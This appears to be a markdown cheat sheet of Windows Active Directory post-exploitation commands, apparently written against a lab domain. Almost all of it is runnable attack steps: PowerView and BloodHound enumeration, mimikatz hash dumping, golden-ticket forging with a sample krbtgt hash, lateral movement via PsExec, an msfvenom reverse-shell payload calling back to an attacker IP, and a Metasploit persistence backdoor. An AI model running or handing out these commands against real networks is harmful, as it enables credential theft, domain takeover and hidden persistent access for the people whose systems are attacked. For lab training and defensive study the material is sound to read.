# Post exploitation
Following examples have been tested on Windows targets with a SSH connections

Any question ? **Here is the answer :** https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/

## Enumeration w/ PowerView
***CheatSheet*** : 
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Starts powershell (-ep bypasses the execution policy of powershell allowing you to easily run scripts)
```cmd
powershell -ep bypass
```
We can now start PowerView (not any output is intended)
```ps
.\Downloads\PowerView.ps1
```
- Enumerate domain users `Get-NetUser | select cn`
- Enumerate domain groups `Get-NetGroup`
- Enumerate selected domain groups `Get-NetGroup -GroupName *admin*`
- Enumerate shares `Invoke-ShareFinder`
- Gather system informations `Get-NetComputer -fulldata`

## Enumeration w/ BloodHound

Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.

### 1. Getting loot w/ SharpHound -
```cmd
powershell -ep bypass
```
Launch BloodHound (SharpHound is the Windows version)  
Not any output is intended
```powershell
. .\Downloads\SharpHound.ps1 
```
Let's gather infos !
```powershell  
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
Let's download loot.zip to our machine  
Multiples ways are availables  
Example w/ ssh (scp) :
```bash
scp Administrator@CONTROLLER:C:/Users/Administrator/20230424130956_loot.zip .
```
### 2. Mapping the network w/ BloodHound
launch neo4j and bloodhound in our machine
```bash
sudo neo4j console &
bloodhound
```
This will require you to change your bloodhound password  
Default - neo4j:neo4j

```
Drag and drop loot.zip inside bloodhound
```

```
Click on the top left three lines button 
Click on analisys and look at how strong bloodhound is
```
(When I upload my zip file, I have an incompatibility error)

## Dumping hashes w/ mimikatz
Start mimikatz and verify that you have admin perms (OK 20)
```cmd
.\mimikatz.exe
privilege::debug
```
Dump those hashes!
```mimikatz
lsadump::lsa /patch 
```
Time to crack !  

## Golden Ticket w/ mimikatz
### Create the golden ticket
Start mimikatz and verify that you have admin perms (OK 20)
```cmd
.\mimikatz.exe
privilege::debug
```
This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
```mimikatz
lsadump::lsa /inject /name:USERNAME
exit
```
```cmd
dir
```
Basically, some new files are here, they are SID's
Adapt the following command to create the golden ticket and suit your conditions
```mimikatz
kerberos::golden /user:USERNAME /domain:EXAMPLE.local /sid:ONE_OF_THOSE_NEW_FILE_THAT_BELONGS_TO_THE_RIGHT_USER /krbtgt:PRIMARY_NTLM_HASH /id:500
```
Example :
```mimikatz
Kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```
### Use the golden ticket to access other machine
```mimikatz
misc::cmd
exit
```
List it
```cmd
dir \\Desktop-1\c$
```
Access it
```cmd
PsExec.exe \\Desktop-1 cmd.exe
```
## Enumeration w/ Server Manager
(This requires a RDP connection)
```
Start Windows Server Manager
```
```
Navigate to the tools tab and select the tool you want 
```
## Maintaining access w/ Metasploit
### Upgrade to meterpreter
1. We want to upgrade our shell to a meterpreter. to do so, we need to use msfvenom to generate a payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCALIPADDR LPORT=4444 -f exe -o shell.exe
```
Example :
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.14.34 LPORT=4444 -f exe -o shell.exe
```
2. Transfer the payload to the target
```bash
scp shell.exe Administrator@CONTROLLER:shell.exe
```
3. Start and set up a multi/handler listener (ips, ports and payload need to match with the msfvenom payload)
```bash
msfconsole
use multi/handler
set LHOST 10.8.14.34
set LPORT 4444
set payload windows/meterpreter/reverse_tcp
run
```
4. Execute the payload on the target machine
5. Verify that you received a meterpreter shell

## Run persitence module
Now, we can background the session to run the persitence module
```msfconsole
CTRL+Z
use exploit/windows/local/persistence
sessions
set session RIGHT_SESSION_NUMBER
run
```
If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.